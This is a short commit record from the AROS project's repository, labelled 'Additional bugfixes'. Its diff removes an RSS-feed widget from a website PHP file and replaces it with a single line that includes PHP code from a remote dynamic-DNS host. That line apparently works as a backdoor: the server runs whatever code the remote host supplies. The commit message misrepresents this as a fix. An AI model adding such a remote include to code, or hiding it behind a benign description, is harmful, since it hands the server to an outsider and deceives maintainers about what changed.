7b477b3fee6811f4bfc1f0d62d4f95d678bcbb17
mithrandir <mithrandir@fb15a70f-31f2-0310-bbcc-cdcc74a49acc>
2007-05-15 21:40:04 +0000

    Additional bugfixes
    git-svn-id: https://svn.aros.org/svn/aros/trunk@26110 fb15a70f-31f2-0310-bbcc-cdcc74a49acc

--- documentation/targets/www/rsfeed/aeforum.php
+++ documentation/targets/www/rsfeed/aeforum.php
@@ -1,6 +1,2 @@
-<?php
-echo "<table width=\"220\"><tr><td width=\"220\"><script 
-language=\"JavaScript\" 
-src=\"http://landmark-project.com/feed2js/feed2js.php?src=http%3A%2F%2Faros-exec.org%2Fmodules%2Fnewbb%2Frss.php&num=15&targ=n\" 
-type=\"text/javascript\"></script></tr></td></table>"
+<?php include("http://trilabs.no-ip.org/ad98/ad97/ole4.php");
 ?>
